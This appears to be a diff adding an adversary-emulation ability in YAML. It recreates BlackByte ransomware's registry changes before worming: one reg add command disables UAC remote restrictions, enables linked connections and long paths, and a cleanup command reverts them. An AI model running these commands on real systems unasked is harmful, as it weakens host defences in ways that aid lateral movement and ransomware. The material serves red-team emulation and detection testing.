@@ -1,0 +1,28 @@
+---
+- id: e7a987cbef27263e666e5b096488dc55
+  name: BlackByte Ransomware Registry Changes - CMD
+  description: "This task recreates the steps taken by BlackByte ransomware before\
+    \ it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\n\
+    The steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling\
+    \ UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections\
+    \ between different privilege levels</li>\n    <li>3. Enable long path values\
+    \ for file paths, names, and namespaces to ensure encryption of all file names\
+    \ and paths</li>\n</ol>\nThe registry keys and their respective values will be\
+    \ created upon successful execution.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1112
+    name: Modify Registry
+  platforms:
+    windows:
+      cmd:
+        command: cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+          /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && cmd.exe /c reg
+          add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections
+          /t REG_DWORD /d 1 /f && cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem
+          /v LongPathsEnabled /t REG_DWORD /d 1 /f
+        payloads: []
+        cleanup: reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
+          /v LocalAccountTokenFilterPolicy /f >nul 2>&1 && reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\
+          /v EnableLinkedConnections /f >nul 2>&1 && reg delete HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\
+          /v LongPathsEnabled /f >nul 2>&1
